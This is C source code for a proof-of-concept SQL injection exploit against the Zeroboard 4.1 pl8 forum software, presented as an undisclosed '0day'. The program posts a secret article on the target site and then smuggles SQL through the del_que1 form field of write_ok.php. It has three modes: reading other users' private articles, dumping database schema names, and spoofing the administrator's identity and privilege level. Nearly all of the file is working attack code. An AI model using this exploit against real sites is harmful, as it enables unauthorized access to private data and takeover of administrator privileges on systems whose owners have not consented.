#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>

#define DESC \
"[!] Zeroboard 4.1 pl8 0day exploit. (Ver 0x01 - PoC)\n\n" \
"THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!\n\n" \
"Exploited by indra (indra.kr \\x40 gmail.com)\n\n"

#define DEFAULT_IDENT	"Viewer"
#define DEFAULT_PASS	"p455w0rd"

#define READ_PRIV_ARTICLE	0x01
#define READ_INFOR_SCHEMA	0x02
#define ADMIN_ID_SPOOFING	0x03

struct t_info {
	char target[64];
	unsigned short port;
	char path[128];
	char bid[64];
	unsigned int no;
};

const char *crlf = "\x0D\x0A\x0D\x0A";

void *parse_info(const char *, unsigned char);
int socket_set(const char *, unsigned short);
void *make_form_data(const char *);
void *make_referer(struct t_info *, unsigned int, const char *);
void *make_header(const char *, unsigned int, const char *, const char *);
unsigned int write_new_content(struct t_info *);
int strip_header(int);
unsigned int get_my_article_number(const char *);
unsigned int do_exploit(struct t_info *, unsigned int, unsigned char);

int main(void)
{
	unsigned char type = 0;
	unsigned int my_no = 0, new_no = 0;
	char url[1024];
	static struct t_info *info = NULL;

	fprintf(stdout, "%s", DESC);

	fprintf(stdout, 
		"[*] Choose the attack type.\n\n"
		"1. Reading a private article.\n"
		"2. Viewing Database lists. (use INFORMATION_SCHEMA)\n"
		"3. Admin ID Spoofing.\n"
		"Input Type: ");
	fgets(url, sizeof(url), stdin);
	type = atoi(url);

	memset(url, 0x00, sizeof(url));
	fprintf(stdout, "\nInput URL: ");
	fgets(url, sizeof(url), stdin);

	// remove linefeed
	url[strlen(url) - 1] = '\0';

	fprintf(stdout, "[*] URL Parsing.....\n");

	if((info = parse_info(url, type)) == NULL) {
		goto failed;
	}

	fprintf(stdout, 
		"  [+] Target: %s\n"
		"  [+] Port: %d\n"
		"  [+] Path: %s\n"
		"  [+] Board ID: %s\n", 
		info->target, info->port, info->path, info->bid);

	if(type == READ_PRIV_ARTICLE) {
		fprintf(stdout, "  [+] Article Number: %u\n", info->no);
	}

	fprintf(stdout, "[*] Posting a new article.\n");
	if((my_no = write_new_content(info)) < 0) {
		goto failed;
	}

	fprintf(stdout, "[*] Injecting SQL command.\n");
	if((new_no = do_exploit(info, my_no, type)) < 0) {
		goto failed;
	}

	fprintf(stdout,
		"[*] Visit URL.\n"
		"  [+] http://%s:%d%s/view.php?id=%s&no=%d\n", 
		info->target, info->port, info->path, info->bid, new_no);

	return EXIT_SUCCESS;

failed:
	return EXIT_FAILURE;
}

/* {{{ void *parse_info(const char *url, unsigned char type) */
void *parse_info(const char *url, unsigned char type)
{
	int i = 0;
	char *s_ptr = NULL, *tmp = NULL;
	static struct t_info info;

	memset(&info, 0x00, sizeof(info));

	if(memcmp(url, "http://", 7) != 0) {
		fprintf(stderr, "[!] Illegal URL (%s)\n", url);
		return NULL;
	}

	s_ptr = (char*)url + 7;

	if((tmp = strchr(s_ptr, ':')) == NULL) {
		info.port = 80;
		if((tmp = strchr(s_ptr, '/')) != NULL) {
			memcpy(info.target, s_ptr, tmp - s_ptr);
		}
	} else {
		info.port = atoi(tmp + 1);
		memcpy(info.target, s_ptr, tmp - s_ptr);
		tmp = strchr(s_ptr, '/');
	}

	s_ptr = tmp;
	if((tmp = strrchr(s_ptr, '/')) != NULL) {
		memcpy(info.path, s_ptr, tmp - s_ptr);
	}
	s_ptr = tmp;
	if((tmp = strstr(s_ptr, "id=")) != NULL) {
		tmp += strlen("id=");
		for(i = 0; i < sizeof(info.bid); i++) {
			if(tmp[i] == '&') break;
			info.bid[i] = tmp[i];
		}
	}
	s_ptr = tmp;
	if((tmp = strstr(s_ptr, "no=")) != NULL) {
		tmp += strlen("no=");
		info.no = strtol(tmp, (char**)NULL, 10);
	}

	if(info.target[0] == '\0' || 
			info.path[0] == '\0' || 
			info.bid[0] == '\0' || 
			info.port == 0)
		return NULL;
	if(type == READ_PRIV_ARTICLE && info.no == 0)
		return NULL;

	return &info;
}
/* }}} */

/* {{{ int socket_set(const char *dst, unsigned short port) */
int socket_set(const char *dst, unsigned short port)
{
	int s = 0;
	struct sockaddr_in sin;
	struct hostent *he = NULL;
	
	if((he = gethostbyname(dst)) == NULL) {
		fprintf(stderr, "[!] gethostbyname() function error.\n");
		return -1;
	}

	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "[!] socket() function error.\n");
		return -1;
	}

	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);

	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
		fprintf(stderr, "[!] connect() function error.\n");
		return -1;
	}

	return s;
}
/* }}} */

/* {{{ void *make_form_data(const char *mode) */
void *make_form_data(const char *mode)
{
	static char data[1024];

	snprintf(data, sizeof(data), 
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"id\"\r\n\r\n"
		"test\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"mode\"\r\n\r\n"
		"%s\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"name\"\r\n\r\n"
		"%s\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"password\"\r\n\r\n"
		"%s\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"subject\"\r\n\r\n"
		"test\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"memo\"\r\n\r\n"
		"test\r\n"
		"----boundary\r\n"
		"Content-Disposition: form-data; name=\"is_secret\"\r\n\r\n"
		"1\r\n"
		"----boundary--\r\n", mode, DEFAULT_IDENT, DEFAULT_PASS);
	return &data;
}
/* }}} */

/* {{{ void *make_referer(struct t_info *info, unsigned int my_no, const char *mode) */
void *make_referer(struct t_info *info, unsigned int my_no, const char *mode)
{
	static char referer[512];

	snprintf(referer, sizeof(referer),
			"http://%s%swrite.php?id=%s&page=1&sn1=&divpage=1&"
			"sn=off&ss=on&sc=on&select_arrenge=headnum&desc=asc&"
			"no=%d&mode=%s&sn1=&divpage=1",
		info->target, info->path, info->bid, my_no, mode);
	return &referer;
}
/* }}} */

/* {{{ void *make_header(const char *path, unsigned int cl, const char *host, const char *referer) */
void *make_header(const char *path, unsigned int cl, const char *host, const char *referer)
{
	static char header[1024];

	snprintf(header, sizeof(header),
			"POST %s HTTP/1.0\r\n"
			"Content-Type: multipart/form-data; boundary=--boundary\r\n"
			"Content-Length: %d\n"
			"Host: %s\r\n"
			"Referer: %s\r\n"
			"Connection: Close\r\n\r\n",
			path, cl, host, referer);
	return &header;
}
/* }}} */

/* {{{ unsigned int write_new_content(struct t_info *info) */
unsigned int write_new_content(struct t_info *info)
{
	unsigned int my_no = 0;
	int s = 0, n = 0;
	char *ptr = NULL, *header = NULL, *referer = NULL;
	char recvbuf[1024], path[256];
	char *formdata = make_form_data("write");

	fprintf(stdout, "  [+] Creating a REFERER.\n");
	referer = make_referer(info, 1, "write");

	snprintf(path, sizeof(path), "%s/write_ok.php", info->path);

	fprintf(stdout, "  [+] Creating a HEADER.\n");
	header = make_header(path, strlen(formdata), info->target, referer);

	fprintf(stdout, "  [+] Attempt to posting.\n");
	if((s = socket_set(info->target, info->port)) < 0)
		return -1;
	
	send(s, header, strlen(header), 0);
	send(s, formdata, strlen(formdata), 0);

	if(strip_header(s) != 200) {
		fprintf(stderr, "[!] FAILED (Response code is not '200')\n");
		close(s);
		return -1;
	}

	while((n = recv(s, recvbuf, sizeof(recvbuf) - 1, 0)) != 0) {
		recvbuf[n] = '\0';
		//fprintf(stdout, "recvbuf: %s\n", recvbuf);
	}

	close(s);

	if((my_no = get_my_article_number(recvbuf)) < 0) {
		fprintf(stderr, "[!] Can't get my private article number.\n");
		return -1;
	}

	fprintf(stdout, "  [+] My private article number: %d\n", my_no);
	fprintf(stdout, "  [+] Posted ID/PASSWORD: %s/%s\n", 
			DEFAULT_IDENT, DEFAULT_PASS);

	return my_no;
}
/* }}} */

/* {{{ int strip_header(int s) */
int strip_header(int s)
{
	unsigned char acc = 0;
	int n = 0, len = 0, i = 0;
	char *ptr = NULL;
	char buf[1024];
	
	while(1) {
		memset(buf, 0x00, sizeof(buf));
		
		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) == 0)
			return -1;
		if((ptr = strstr(buf, crlf)) != NULL) {
			len = (ptr - buf) + 4;
			recv(s, buf, len, 0);
			goto filled;
		} else {
			for(i = 0; i < n; i++) {
				if(buf[i] == crlf[acc]) {
					acc++;
				} else {
					if(acc > 0) {
						acc = 0;
					}
				}
				if(acc > 3) {
					recv(s, buf, i, 0);
					goto filled;
				}
			}
			recv(s, buf, i, 0);
		}
	}
filled:
	return atoi(buf + 8);
}
/* }}} */

/* {{{ unsigned int get_my_article_number(const char *buf) */
/* write_ok.php의 496번째 라인에서는 SQL update 후의 결과를 return 받아
** $no 라는 변수에 적용시켜줌에 따라 REQUEST시에 받는 내용에서 no값을
** 찾으면 자신이 쓴 글의 번호를 알 수 있음.
*/
unsigned int get_my_article_number(const char *buf)
{
	unsigned int no = -1; // always fail
	char *tmp = NULL;
	if((tmp = strstr(buf, "no=")) != NULL) {
		tmp += strlen("no=");
		no = strtol(tmp, (char**)NULL, 10);
	}
	return no;
}
/* }}} */

/* {{{ unsigned int do_exploit(struct t_info *info, unsigned int my_no, unsigned char type) */
unsigned int do_exploit(struct t_info *info, unsigned int my_no, unsigned char type)
{
	unsigned int new_num = 0;
	int s = 0, n = 0, rsp_code = 0;
	char path[256];
	char *referer =  NULL, *header = NULL, *ptr = NULL;
	char *formdata = make_form_data("modify");
	char add[512];
	char recvbuf[1024];

	referer = make_referer(info, my_no, "modify");

	snprintf(path, sizeof(path), "%s/write_ok.php?no=%d", info->path, my_no);

	/*
	* 기존의 formdata에 del_que1의 정보를 넣기 위한 작업
	*
	* PREV:
	* [...]['d']['a']['r']['y']['-']['-']['\r']['\n']['\0']
	*        ^0x01234567                                ^0x0123456F
	* NEXT:
	* [...]['d']['a']['r']['y']['\r']['\n']['\0']['\n']['\0']
	*        ^0x01234567                                  ^0x0123456F
	*/
	formdata[strlen(formdata) - 4] = '\r';
	formdata[strlen(formdata) - 3] = '\n';
	formdata[strlen(formdata) - 2] = '\0';

	snprintf(add, sizeof(add),
		"Content-Disposition: form-data; name=\"del_que1\"\r\n\r\n");

	switch(type) {
		// 1. A SQL statement for reading private article
		case READ_PRIV_ARTICLE:
			snprintf(add + strlen(add), sizeof(add) - strlen(add),
				",memo=(SELECT memo FROM (SELECT * FROM zetyx_board_%s) AS x WHERE no=%d)\r\n"
				"----boundary--\r\n", info->bid, info->no);
			break;
		// 2. A SQL statement for viewing database list
		// XXX: Buffer size of GROUP_CONCAT() function: 1024bytes (default)
		case READ_INFOR_SCHEMA:
			snprintf(add + strlen(add), sizeof(add) - strlen(add),
				",memo=(SELECT GROUP_CONCAT(DISTINCT table_schema) FROM INFORMATION_SCHEMA.COLUMNS)\r\n"
				"----boundary--\r\n");
			break;
		// 3. Admin ID Spoofing
		case ADMIN_ID_SPOOFING:
			snprintf(add + strlen(add), sizeof(add) - strlen(add),
				",ismember=1,islevel=1,name=(SELECT name FROM (SELECT * FROM zetyx_member_table) AS x WHERE no=1)\r\n"
				"----boundary--\r\n");
			break;
		default:
			return -1;
	}

	header = make_header(path, strlen(formdata) + strlen(add), 
			info->target, referer);

	if((s = socket_set(info->target, info->port)) < 0)
		goto failed;
	
	send(s, header, strlen(header), 0);
	send(s, formdata, strlen(formdata), 0);
	send(s, add, strlen(add), 0);

	if((rsp_code = strip_header(s)) != 200) {
		fprintf(stderr, "[!] FAILED (Response code is not '200')\n");
		goto failed;
	}

	//fprintf(stdout, "-> HEADER: %s\n-> FORMDATA: %s\n-> ADD: %s\n", header, formdata, add);
	while((n = recv(s, recvbuf, sizeof(recvbuf) - 1, 0)) != 0) {
		recvbuf[n] = '\0';
		//fprintf(stdout, "-> RECV: %s\n", recvbuf);
	}

	/*
	* write_ok.php의 530번째 라인에서 실행되는  movepage() 함수는
	* 성공했을 경우 META tag로 페이지 이동을 실행하는 함수로써, 
	* 200번의 HTTP RESPONSE Code와 meta tag가 실행되는지를 체크함으로
	* 글의 포스팅이 제대로 됐는지 확인할 수 있다.
	*/
	if((rsp_code == 200) && (memcmp(recvbuf, "<meta", 5)) == 0) {
		if((ptr = strstr(recvbuf, "no=")) == NULL) {
			goto notfound_new_num;
		} else {
			new_num = atoi(ptr + 3);
		}
		fprintf(stdout, "  [+] SQL Injection..... OK!\n");
	} else {
notfound_new_num:
		fprintf(stdout, "[!] SQL Injection..... FAILED\n");
		goto failed;
	}

	close(s);

	return new_num;
failed:
	if(s != 0)
		close(s);
	return -1;
}
/* }}} */

/*
* vim600: fdm=marker
*/
